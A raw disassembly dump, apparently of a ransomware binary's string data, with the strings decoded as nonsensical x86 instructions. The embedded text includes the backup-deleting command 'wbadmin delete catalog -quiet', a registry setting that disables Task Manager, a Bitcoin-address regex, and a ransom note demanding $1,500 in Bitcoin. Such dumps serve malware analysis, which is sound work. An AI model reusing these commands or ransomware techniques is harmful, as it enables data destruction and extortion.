  40625b:	00 62 00             	add    %ah,0x0(%edx)
  40625e:	6c                   	insb   (%dx),%es:(%edi)
  40625f:	00 65 00             	add    %ah,0x0(%ebp)
  406262:	64 00 20             	add    %ah,%fs:(%eax)
  406265:	00 6e 00             	add    %ch,0x0(%esi)
  406268:	6f                   	outsl  %ds:(%esi),(%dx)
  406269:	00 00                	add    %al,(%eax)
  40626b:	3b 77 00             	cmp    0x0(%edi),%esi
  40626e:	62 00                	bound  %eax,(%eax)
  406270:	61                   	popa
  406271:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  406275:	00 69 00             	add    %ch,0x0(%ecx)
  406278:	6e                   	outsb  %ds:(%esi),(%dx)
  406279:	00 20                	add    %ah,(%eax)
  40627b:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40627f:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  406283:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  406287:	00 20                	add    %ah,(%eax)
  406289:	00 63 00             	add    %ah,0x0(%ebx)
  40628c:	61                   	popa
  40628d:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  406291:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  406295:	00 67 00             	add    %ah,0x0(%edi)
  406298:	20 00                	and    %al,(%eax)
  40629a:	2d 00 71 00 75       	sub    $0x75007100,%eax
  40629f:	00 69 00             	add    %ch,0x0(%ecx)
  4062a2:	65 00 74 00 01       	add    %dh,%gs:0x1(%eax,%eax,1)
  4062a7:	73 53                	jae    0x4062fc
  4062a9:	00 6f 00             	add    %ch,0x0(%edi)
  4062ac:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  4062b1:	00 61 00             	add    %ah,0x0(%ecx)
  4062b4:	72 00                	jb     0x4062b6
  4062b6:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  4062bb:	00 69 00             	add    %ch,0x0(%ecx)
  4062be:	63 00                	arpl   %eax,(%eax)
  4062c0:	72 00                	jb     0x4062c2
  4062c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4062c3:	00 73 00             	add    %dh,0x0(%ebx)
  4062c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4062c7:	00 66 00             	add    %ah,0x0(%esi)
  4062ca:	74 00                	je     0x4062cc
  4062cc:	5c                   	pop    %esp
  4062cd:	00 57 00             	add    %dl,0x0(%edi)
  4062d0:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4062d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4062d7:	00 77 00             	add    %dh,0x0(%edi)
  4062da:	73 00                	jae    0x4062dc
  4062dc:	5c                   	pop    %esp
  4062dd:	00 43 00             	add    %al,0x0(%ebx)
  4062e0:	75 00                	jne    0x4062e2
  4062e2:	72 00                	jb     0x4062e4
  4062e4:	72 00                	jb     0x4062e6
  4062e6:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4062ea:	74 00                	je     0x4062ec
  4062ec:	56                   	push   %esi
  4062ed:	00 65 00             	add    %ah,0x0(%ebp)
  4062f0:	72 00                	jb     0x4062f2
  4062f2:	73 00                	jae    0x4062f4
  4062f4:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4062fa:	5c                   	pop    %esp
  4062fb:	00 50 00             	add    %dl,0x0(%eax)
  4062fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4062ff:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  406303:	00 63 00             	add    %ah,0x0(%ebx)
  406306:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40630c:	5c                   	pop    %esp
  40630d:	00 53 00             	add    %dl,0x0(%ebx)
  406310:	79 00                	jns    0x406312
  406312:	73 00                	jae    0x406314
  406314:	74 00                	je     0x406316
  406316:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40631a:	00 1d 44 00 69 00    	add    %bl,0x690044
  406320:	73 00                	jae    0x406322
  406322:	61                   	popa
  406323:	00 62 00             	add    %ah,0x0(%edx)
  406326:	6c                   	insb   (%dx),%es:(%edi)
  406327:	00 65 00             	add    %ah,0x0(%ebp)
  40632a:	54                   	push   %esp
  40632b:	00 61 00             	add    %ah,0x0(%ecx)
  40632e:	73 00                	jae    0x406330
  406330:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  406333:	00 67 00             	add    %ah,0x0(%edi)
  406336:	72 00                	jb     0x406338
  406338:	00 03                	add    %al,(%ebx)
  40633a:	31 00                	xor    %eax,(%eax)
  40633c:	00 09                	add    %cl,(%ecx)
  40633e:	2e 00 6a 00          	add    %ch,%cs:0x0(%edx)
  406342:	70 00                	jo     0x406344
  406344:	67 00 00             	add    %al,(%bx,%si)
  406347:	13 43 00             	adc    0x0(%ebx),%eax
  40634a:	3a 00                	cmp    (%eax),%al
  40634c:	5c                   	pop    %esp
  40634d:	00 55 00             	add    %dl,0x0(%ebp)
  406350:	73 00                	jae    0x406352
  406352:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406356:	73 00                	jae    0x406358
  406358:	5c                   	pop    %esp
  406359:	00 00                	add    %al,(%eax)
  40635b:	2d 35 00 39 00       	sub    $0x390035,%eax
  406360:	73 00                	jae    0x406362
  406362:	70 00                	jo     0x406364
  406364:	6b 00 77             	imul   $0x77,(%eax),%eax
  406367:	00 68 00             	add    %ch,0x0(%eax)
  40636a:	78 00                	js     0x40636c
  40636c:	37                   	aaa
  40636d:	00 65 00             	add    %ah,0x0(%ebp)
  406370:	79 00                	jns    0x406372
  406372:	63 00                	arpl   %eax,(%eax)
  406374:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  406378:	33 00                	xor    (%eax),%eax
  40637a:	6c                   	insb   (%dx),%es:(%edi)
  40637b:	00 6d 00             	add    %ch,0x0(%ebp)
  40637e:	61                   	popa
  40637f:	00 66 00             	add    %ah,0x0(%esi)
  406382:	34 00                	xor    $0x0,%al
  406384:	37                   	aaa
  406385:	00 32                	add    %dh,(%edx)
  406387:	00 00                	add    %al,(%eax)
  406389:	19 73 00             	sbb    %esi,0x0(%ebx)
  40638c:	75 00                	jne    0x40638e
  40638e:	72 00                	jb     0x406390
  406390:	70 00                	jo     0x406392
  406392:	72 00                	jb     0x406394
  406394:	69 00 73 00 65 00    	imul   $0x650073,(%eax),%eax
  40639a:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40639e:	78 00                	js     0x4063a0
  4063a0:	65 00 00             	add    %al,%gs:(%eax)
  4063a3:	17                   	pop    %ss
  4063a4:	73 00                	jae    0x4063a6
  4063a6:	76 00                	jbe    0x4063a8
  4063a8:	63 00                	arpl   %eax,(%eax)
  4063aa:	68 00 6f 00 73       	push   $0x73006f00
  4063af:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  4063b3:	00 65 00             	add    %ah,0x0(%ebp)
  4063b6:	78 00                	js     0x4063b8
  4063b8:	65 00 00             	add    %al,%gs:(%eax)
  4063bb:	27                   	daa
  4063bc:	4c                   	dec    %esp
  4063bd:	00 31                	add    %dh,(%ecx)
  4063bf:	00 76 00             	add    %dh,0x0(%esi)
  4063c2:	31 00                	xor    %eax,(%eax)
  4063c4:	79 00                	jns    0x4063c6
  4063c6:	35 00 67 00 71       	xor    $0x71006700,%eax
  4063cb:	00 37                	add    %dh,(%edi)
  4063cd:	00 35 00 31 00 70    	add    %dh,0x70003100
  4063d3:	00 69 00             	add    %ch,0x0(%ecx)
  4063d6:	50                   	push   %eax
  4063d7:	00 47 00             	add    %al,0x0(%edi)
  4063da:	47                   	inc    %edi
  4063db:	00 48 00             	add    %cl,0x0(%eax)
  4063de:	4e                   	dec    %esi
  4063df:	00 73 00             	add    %dh,0x0(%ebx)
  4063e2:	00 19                	add    %bl,(%ecx)
  4063e4:	23 00                	and    (%eax),%eax
  4063e6:	62 00                	bound  %eax,(%eax)
  4063e8:	61                   	popa
  4063e9:	00 73 00             	add    %dh,0x0(%ebx)
  4063ec:	65 00 36             	add    %dh,%gs:(%esi)
  4063ef:	00 34 00             	add    %dh,(%eax,%eax,1)
  4063f2:	49                   	dec    %ecx
  4063f3:	00 6d 00             	add    %ch,0x0(%ebp)
  4063f6:	61                   	popa
  4063f7:	00 67 00             	add    %ah,0x0(%edi)
  4063fa:	65 00 00             	add    %al,%gs:(%eax)
  4063fd:	25 31 00 71 00       	and    $0x710031,%eax
  406402:	6e                   	outsb  %ds:(%esi),(%dx)
  406403:	00 35 00 63 00 6d    	add    %dh,0x6d006300
  406409:	00 6a 00             	add    %ch,0x0(%edx)
  40640c:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40640f:	00 75 00             	add    %dh,0x0(%ebp)
  406412:	30 00                	xor    %al,(%eax)
  406414:	33 00                	xor    (%eax),%eax
  406416:	68 00 34 00 39       	push   $0x39003400
  40641b:	00 6d 00             	add    %ch,0x0(%ebp)
  40641e:	6c                   	insb   (%dx),%es:(%edi)
  40641f:	00 36                	add    %dh,(%esi)
  406421:	00 00                	add    %al,(%eax)
  406423:	15 52 00 45 00       	adc    $0x450052,%eax
  406428:	41                   	inc    %ecx
  406429:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  40642d:	00 45 00             	add    %al,0x0(%ebp)
  406430:	2e 00 74 00 78       	add    %dh,%cs:0x78(%eax,%eax,1)
  406435:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  406439:	1f                   	pop    %ds
  40643a:	31 00                	xor    %eax,(%eax)
  40643c:	43                   	inc    %ebx
  40643d:	00 65 00             	add    %ah,0x0(%ebp)
  406440:	65 00 31             	add    %dh,%gs:(%ecx)
  406443:	00 51 00             	add    %dl,0x0(%ecx)
  406446:	4b                   	dec    %ebx
  406447:	00 71 00             	add    %dh,0x0(%ecx)
  40644a:	34 00                	xor    $0x0,%al
  40644c:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  406450:	79 00                	jns    0x406452
  406452:	69 00 4c 00 56 00    	imul   $0x56004c,(%eax),%eax
  406458:	00 05 62 00 63 00    	add    %al,0x630062
  40645e:	00 73 28             	add    %dh,0x28(%ebx)
  406461:	00 3f                	add    %bh,(%edi)
  406463:	00 3a                	add    %bh,(%edx)
  406465:	00 5b 00             	add    %bl,0x0(%ebx)
  406468:	31 00                	xor    %eax,(%eax)
  40646a:	33 00                	xor    (%eax),%eax
  40646c:	5d                   	pop    %ebp
  40646d:	00 7b 00             	add    %bh,0x0(%ebx)
  406470:	31 00                	xor    %eax,(%eax)
  406472:	7d 00                	jge    0x406474
  406474:	5b                   	pop    %ebx
  406475:	00 61 00             	add    %ah,0x0(%ecx)
  406478:	2d 00 6b 00 6d       	sub    $0x6d006b00,%eax
  40647d:	00 2d 00 7a 00 41    	add    %ch,0x41007a00
  406483:	00 2d 00 48 00 4a    	add    %ch,0x4a004800
  406489:	00 2d 00 4e 00 50    	add    %ch,0x50004e00
  40648f:	00 2d 00 5a 00 31    	add    %ch,0x31005a00
  406495:	00 2d 00 39 00 5d    	add    %ch,0x5d003900
  40649b:	00 7b 00             	add    %bh,0x0(%ebx)
  40649e:	32 00                	xor    (%eax),%al
  4064a0:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  4064a4:	33 00                	xor    (%eax),%eax
  4064a6:	33 00                	xor    (%eax),%eax
  4064a8:	7d 00                	jge    0x4064aa
  4064aa:	7c 00                	jl     0x4064ac
  4064ac:	62 00                	bound  %eax,(%eax)
  4064ae:	63 00                	arpl   %eax,(%eax)
  4064b0:	31 00                	xor    %eax,(%eax)
  4064b2:	5b                   	pop    %ebx
  4064b3:	00 61 00             	add    %ah,0x0(%ecx)
  4064b6:	2d 00 7a 00 30       	sub    $0x30007a00,%eax
  4064bb:	00 2d 00 39 00 5d    	add    %ch,0x5d003900
  4064c1:	00 7b 00             	add    %bh,0x0(%ebx)
  4064c4:	33 00                	xor    (%eax),%eax
  4064c6:	39 00                	cmp    %eax,(%eax)
  4064c8:	2c 00                	sub    $0x0,%al
  4064ca:	35 00 39 00 7d       	xor    $0x7d003900,%eax
  4064cf:	00 29                	add    %ch,(%ecx)
  4064d1:	00 01                	add    %al,(%ecx)
  4064d3:	4b                   	dec    %ebx
  4064d4:	41                   	inc    %ecx
  4064d5:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4064d9:	00 20                	add    %ah,(%eax)
  4064db:	00 6f 00             	add    %ch,0x0(%edi)
  4064de:	66 00 20             	data16 add %ah,(%eax)
  4064e1:	00 79 00             	add    %bh,0x0(%ecx)
  4064e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4064e5:	00 75 00             	add    %dh,0x0(%ebp)
  4064e8:	72 00                	jb     0x4064ea
  4064ea:	20 00                	and    %al,(%eax)
  4064ec:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  4064f0:	6c                   	insb   (%dx),%es:(%edi)
  4064f1:	00 65 00             	add    %ah,0x0(%ebp)
  4064f4:	73 00                	jae    0x4064f6
  4064f6:	20 00                	and    %al,(%eax)
  4064f8:	68 00 61 00 76       	push   $0x76006100
  4064fd:	00 65 00             	add    %ah,0x0(%ebp)
  406500:	20 00                	and    %al,(%eax)
  406502:	62 00                	bound  %eax,(%eax)
  406504:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  406508:	6e                   	outsb  %ds:(%esi),(%dx)
  406509:	00 20                	add    %ah,(%eax)
  40650b:	00 65 00             	add    %ah,0x0(%ebp)
  40650e:	6e                   	outsb  %ds:(%esi),(%dx)
  40650f:	00 63 00             	add    %ah,0x0(%ebx)
  406512:	72 00                	jb     0x406514
  406514:	79 00                	jns    0x406516
  406516:	70 00                	jo     0x406518
  406518:	74 00                	je     0x40651a
  40651a:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40651f:	80 c3 59             	add    $0x59,%bl
  406522:	00 6f 00             	add    %ch,0x0(%edi)
  406525:	75 00                	jne    0x406527
  406527:	72 00                	jb     0x406529
  406529:	20 00                	and    %al,(%eax)
  40652b:	63 00                	arpl   %eax,(%eax)
  40652d:	6f                   	outsl  %ds:(%esi),(%dx)
  40652e:	00 6d 00             	add    %ch,0x0(%ebp)
  406531:	70 00                	jo     0x406533
  406533:	75 00                	jne    0x406535
  406535:	74 00                	je     0x406537
  406537:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40653b:	20 00                	and    %al,(%eax)
  40653d:	77 00                	ja     0x40653f
  40653f:	61                   	popa
  406540:	00 73 00             	add    %dh,0x0(%ebx)
  406543:	20 00                	and    %al,(%eax)
  406545:	69 00 6e 00 66 00    	imul   $0x66006e,(%eax),%eax
  40654b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40654f:	74 00                	je     0x406551
  406551:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  406556:	00 77 00             	add    %dh,0x0(%edi)
  406559:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  40655f:	20 00                	and    %al,(%eax)
  406561:	61                   	popa
  406562:	00 20                	add    %ah,(%eax)
  406564:	00 72 00             	add    %dh,0x0(%edx)
  406567:	61                   	popa
  406568:	00 6e 00             	add    %ch,0x0(%esi)
  40656b:	73 00                	jae    0x40656d
  40656d:	6f                   	outsl  %ds:(%esi),(%dx)
  40656e:	00 6d 00             	add    %ch,0x0(%ebp)
  406571:	77 00                	ja     0x406573
  406573:	61                   	popa
  406574:	00 72 00             	add    %dh,0x0(%edx)
  406577:	65 00 20             	add    %ah,%gs:(%eax)
  40657a:	00 76 00             	add    %dh,0x0(%esi)
  40657d:	69 00 72 00 75 00    	imul   $0x750072,(%eax),%eax
  406583:	73 00                	jae    0x406585
  406585:	2e 00 20             	add    %ah,%cs:(%eax)
  406588:	00 59 00             	add    %bl,0x0(%ecx)
  40658b:	6f                   	outsl  %ds:(%esi),(%dx)
  40658c:	00 75 00             	add    %dh,0x0(%ebp)
  40658f:	72 00                	jb     0x406591
  406591:	20 00                	and    %al,(%eax)
  406593:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  406597:	6c                   	insb   (%dx),%es:(%edi)
  406598:	00 65 00             	add    %ah,0x0(%ebp)
  40659b:	73 00                	jae    0x40659d
  40659d:	20 00                	and    %al,(%eax)
  40659f:	68 00 61 00 76       	push   $0x76006100
  4065a4:	00 65 00             	add    %ah,0x0(%ebp)
  4065a7:	20 00                	and    %al,(%eax)
  4065a9:	62 00                	bound  %eax,(%eax)
  4065ab:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  4065af:	6e                   	outsb  %ds:(%esi),(%dx)
  4065b0:	00 20                	add    %ah,(%eax)
  4065b2:	00 65 00             	add    %ah,0x0(%ebp)
  4065b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4065b6:	00 63 00             	add    %ah,0x0(%ebx)
  4065b9:	72 00                	jb     0x4065bb
  4065bb:	79 00                	jns    0x4065bd
  4065bd:	70 00                	jo     0x4065bf
  4065bf:	74 00                	je     0x4065c1
  4065c1:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  4065c6:	00 61 00             	add    %ah,0x0(%ecx)
  4065c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4065ca:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  4065ce:	00 79 00             	add    %bh,0x0(%ecx)
  4065d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4065d2:	00 75 00             	add    %dh,0x0(%ebp)
  4065d5:	20 00                	and    %al,(%eax)
  4065d7:	77 00                	ja     0x4065d9
  4065d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4065da:	00 6e 00             	add    %ch,0x0(%esi)
  4065dd:	27                   	daa
  4065de:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  4065e2:	00 01                	add    %al,(%ecx)
  4065e4:	80 c9 62             	or     $0x62,%cl
  4065e7:	00 65 00             	add    %ah,0x0(%ebp)
  4065ea:	20 00                	and    %al,(%eax)
  4065ec:	61                   	popa
  4065ed:	00 62 00             	add    %ah,0x0(%edx)
  4065f0:	6c                   	insb   (%dx),%es:(%edi)
  4065f1:	00 65 00             	add    %ah,0x0(%ebp)
  4065f4:	20 00                	and    %al,(%eax)
  4065f6:	74 00                	je     0x4065f8
  4065f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4065f9:	00 20                	add    %ah,(%eax)
  4065fb:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4065ff:	00 63 00             	add    %ah,0x0(%ebx)
  406602:	72 00                	jb     0x406604
  406604:	79 00                	jns    0x406606
  406606:	70 00                	jo     0x406608
  406608:	74 00                	je     0x40660a
  40660a:	20 00                	and    %al,(%eax)
  40660c:	74 00                	je     0x40660e
  40660e:	68 00 65 00 6d       	push   $0x6d006500
  406613:	00 20                	add    %ah,(%eax)
  406615:	00 77 00             	add    %dh,0x0(%edi)
  406618:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  40661e:	6f                   	outsl  %ds:(%esi),(%dx)
  40661f:	00 75 00             	add    %dh,0x0(%ebp)
  406622:	74 00                	je     0x406624
  406624:	20 00                	and    %al,(%eax)
  406626:	6f                   	outsl  %ds:(%esi),(%dx)
  406627:	00 75 00             	add    %dh,0x0(%ebp)
  40662a:	72 00                	jb     0x40662c
  40662c:	20 00                	and    %al,(%eax)
  40662e:	68 00 65 00 6c       	push   $0x6c006500
  406633:	00 70 00             	add    %dh,0x0(%eax)
  406636:	2e 00 57 00          	add    %dl,%cs:0x0(%edi)
  40663a:	68 00 61 00 74       	push   $0x74006100
  40663f:	00 20                	add    %ah,(%eax)
  406641:	00 63 00             	add    %ah,0x0(%ebx)
  406644:	61                   	popa
  406645:	00 6e 00             	add    %ch,0x0(%esi)
  406648:	20 00                	and    %al,(%eax)
  40664a:	49                   	dec    %ecx
  40664b:	00 20                	add    %ah,(%eax)
  40664d:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  406651:	00 20                	add    %ah,(%eax)
  406653:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  406657:	00 20                	add    %ah,(%eax)
  406659:	00 67 00             	add    %ah,0x0(%edi)
  40665c:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  406661:	00 6d 00             	add    %ch,0x0(%ebp)
  406664:	79 00                	jns    0x406666
  406666:	20 00                	and    %al,(%eax)
  406668:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40666c:	6c                   	insb   (%dx),%es:(%edi)
  40666d:	00 65 00             	add    %ah,0x0(%ebp)
  406670:	73 00                	jae    0x406672
  406672:	20 00                	and    %al,(%eax)
  406674:	62 00                	bound  %eax,(%eax)
  406676:	61                   	popa
  406677:	00 63 00             	add    %ah,0x0(%ebx)
  40667a:	6b 00 3f             	imul   $0x3f,(%eax),%eax
  40667d:	00 59 00             	add    %bl,0x0(%ecx)
  406680:	6f                   	outsl  %ds:(%esi),(%dx)
  406681:	00 75 00             	add    %dh,0x0(%ebp)
  406684:	20 00                	and    %al,(%eax)
  406686:	63 00                	arpl   %eax,(%eax)
  406688:	61                   	popa
  406689:	00 6e 00             	add    %ch,0x0(%esi)
  40668c:	20 00                	and    %al,(%eax)
  40668e:	62 00                	bound  %eax,(%eax)
  406690:	75 00                	jne    0x406692
  406692:	79 00                	jns    0x406694
  406694:	20 00                	and    %al,(%eax)
  406696:	6f                   	outsl  %ds:(%esi),(%dx)
  406697:	00 75 00             	add    %dh,0x0(%ebp)
  40669a:	72 00                	jb     0x40669c
  40669c:	20 00                	and    %al,(%eax)
  40669e:	73 00                	jae    0x4066a0
  4066a0:	70 00                	jo     0x4066a2
  4066a2:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4066a6:	69 00 61 00 6c 00    	imul   $0x6c0061,(%eax),%eax
  4066ac:	20 00                	and    %al,(%eax)
  4066ae:	00 80 b9 64 00 65    	add    %al,0x650064b9(%eax)
  4066b4:	00 63 00             	add    %ah,0x0(%ebx)
  4066b7:	72 00                	jb     0x4066b9
  4066b9:	79 00                	jns    0x4066bb
  4066bb:	70 00                	jo     0x4066bd
  4066bd:	74 00                	je     0x4066bf
  4066bf:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4066c5:	20 00                	and    %al,(%eax)
  4066c7:	73 00                	jae    0x4066c9
  4066c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4066ca:	00 66 00             	add    %ah,0x0(%esi)
  4066cd:	74 00                	je     0x4066cf
  4066cf:	77 00                	ja     0x4066d1
  4066d1:	61                   	popa
  4066d2:	00 72 00             	add    %dh,0x0(%edx)
  4066d5:	65 00 2c 00          	add    %ch,%gs:(%eax,%eax,1)
  4066d9:	20 00                	and    %al,(%eax)
  4066db:	74 00                	je     0x4066dd
  4066dd:	68 00 69 00 73       	push   $0x73006900
  4066e2:	00 20                	add    %ah,(%eax)
  4066e4:	00 73 00             	add    %dh,0x0(%ebx)
  4066e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4066e8:	00 66 00             	add    %ah,0x0(%esi)
  4066eb:	74 00                	je     0x4066ed
  4066ed:	77 00                	ja     0x4066ef
  4066ef:	61                   	popa
  4066f0:	00 72 00             	add    %dh,0x0(%edx)
  4066f3:	65 00 20             	add    %ah,%gs:(%eax)
  4066f6:	00 77 00             	add    %dh,0x0(%edi)
  4066f9:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  4066ff:	20 00                	and    %al,(%eax)
  406701:	61                   	popa
  406702:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  406706:	00 6f 00             	add    %ch,0x0(%edi)
  406709:	77 00                	ja     0x40670b
  40670b:	20 00                	and    %al,(%eax)
  40670d:	79 00                	jns    0x40670f
  40670f:	6f                   	outsl  %ds:(%esi),(%dx)
  406710:	00 75 00             	add    %dh,0x0(%ebp)
  406713:	20 00                	and    %al,(%eax)
  406715:	74 00                	je     0x406717
  406717:	6f                   	outsl  %ds:(%esi),(%dx)
  406718:	00 20                	add    %ah,(%eax)
  40671a:	00 72 00             	add    %dh,0x0(%edx)
  40671d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  406721:	6f                   	outsl  %ds:(%esi),(%dx)
  406722:	00 76 00             	add    %dh,0x0(%esi)
  406725:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406729:	20 00                	and    %al,(%eax)
  40672b:	61                   	popa
  40672c:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  406730:	00 20                	add    %ah,(%eax)
  406732:	00 6f 00             	add    %ch,0x0(%edi)
  406735:	66 00 20             	data16 add %ah,(%eax)
  406738:	00 79 00             	add    %bh,0x0(%ecx)
  40673b:	6f                   	outsl  %ds:(%esi),(%dx)
  40673c:	00 75 00             	add    %dh,0x0(%ebp)
  40673f:	72 00                	jb     0x406741
  406741:	20 00                	and    %al,(%eax)
  406743:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  406747:	74 00                	je     0x406749
  406749:	61                   	popa
  40674a:	00 20                	add    %ah,(%eax)
  40674c:	00 61 00             	add    %ah,0x0(%ecx)
  40674f:	6e                   	outsb  %ds:(%esi),(%dx)
  406750:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  406754:	00 72 00             	add    %dh,0x0(%edx)
  406757:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40675b:	6f                   	outsl  %ds:(%esi),(%dx)
  40675c:	00 76 00             	add    %dh,0x0(%esi)
  40675f:	65 00 20             	add    %ah,%gs:(%eax)
  406762:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  406766:	00 65 00             	add    %ah,0x0(%ebp)
  406769:	00 80 d1 72 00 61    	add    %al,0x610072d1(%eax)
  40676f:	00 6e 00             	add    %ch,0x0(%esi)
  406772:	73 00                	jae    0x406774
  406774:	6f                   	outsl  %ds:(%esi),(%dx)
  406775:	00 6d 00             	add    %ch,0x0(%ebp)
  406778:	77 00                	ja     0x40677a
  40677a:	61                   	popa
  40677b:	00 72 00             	add    %dh,0x0(%edx)
  40677e:	65 00 20             	add    %ah,%gs:(%eax)
  406781:	00 66 00             	add    %ah,0x0(%esi)
  406784:	72 00                	jb     0x406786
  406786:	6f                   	outsl  %ds:(%esi),(%dx)
  406787:	00 6d 00             	add    %ch,0x0(%ebp)
  40678a:	20 00                	and    %al,(%eax)
  40678c:	79 00                	jns    0x40678e
  40678e:	6f                   	outsl  %ds:(%esi),(%dx)
  40678f:	00 75 00             	add    %dh,0x0(%ebp)
  406792:	72 00                	jb     0x406794
  406794:	20 00                	and    %al,(%eax)
  406796:	63 00                	arpl   %eax,(%eax)
  406798:	6f                   	outsl  %ds:(%esi),(%dx)
  406799:	00 6d 00             	add    %ch,0x0(%ebp)
  40679c:	70 00                	jo     0x40679e
  40679e:	75 00                	jne    0x4067a0
  4067a0:	74 00                	je     0x4067a2
  4067a2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4067a6:	2e 00 54 00 68       	add    %dl,%cs:0x68(%eax,%eax,1)
  4067ab:	00 65 00             	add    %ah,0x0(%ebp)
  4067ae:	20 00                	and    %al,(%eax)
  4067b0:	70 00                	jo     0x4067b2
  4067b2:	72 00                	jb     0x4067b4
  4067b4:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  4067ba:	20 00                	and    %al,(%eax)
  4067bc:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  4067c0:	72 00                	jb     0x4067c2
  4067c2:	20 00                	and    %al,(%eax)
  4067c4:	74 00                	je     0x4067c6
  4067c6:	68 00 65 00 20       	push   $0x20006500
  4067cb:	00 73 00             	add    %dh,0x0(%ebx)
  4067ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4067cf:	00 66 00             	add    %ah,0x0(%esi)
  4067d2:	74 00                	je     0x4067d4
  4067d4:	77 00                	ja     0x4067d6
  4067d6:	61                   	popa
  4067d7:	00 72 00             	add    %dh,0x0(%edx)
  4067da:	65 00 20             	add    %ah,%gs:(%eax)
  4067dd:	00 69 00             	add    %ch,0x0(%ecx)
  4067e0:	73 00                	jae    0x4067e2
  4067e2:	20 00                	and    %al,(%eax)
  4067e4:	24 00                	and    $0x0,%al
  4067e6:	31 00                	xor    %eax,(%eax)
  4067e8:	2c 00                	sub    $0x0,%al
  4067ea:	35 00 30 00 30       	xor    $0x30003000,%eax
  4067ef:	00 2e                	add    %ch,(%esi)
  4067f1:	00 20                	add    %ah,(%eax)
  4067f3:	00 50 00             	add    %dl,0x0(%eax)
  4067f6:	61                   	popa
  4067f7:	00 79 00             	add    %bh,0x0(%ecx)
  4067fa:	6d                   	insl   (%dx),%es:(%edi)
  4067fb:	00 65 00             	add    %ah,0x0(%ebp)
  4067fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4067ff:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  406803:	00 63 00             	add    %ah,0x0(%ebx)
  406806:	61                   	popa
  406807:	00 6e 00             	add    %ch,0x0(%esi)
  40680a:	20 00                	and    %al,(%eax)
  40680c:	62 00                	bound  %eax,(%eax)
  40680e:	65 00 20             	add    %ah,%gs:(%eax)
  406811:	00 6d 00             	add    %ch,0x0(%ebp)
  406814:	61                   	popa
  406815:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  406819:	00 20                	add    %ah,(%eax)
  40681b:	00 69 00             	add    %ch,0x0(%ecx)
  40681e:	6e                   	outsb  %ds:(%esi),(%dx)
  40681f:	00 20                	add    %ah,(%eax)
  406821:	00 42 00             	add    %al,0x0(%edx)
  406824:	69 00 74 00 63 00    	imul   $0x630074,(%eax),%eax
  40682a:	6f                   	outsl  %ds:(%esi),(%dx)
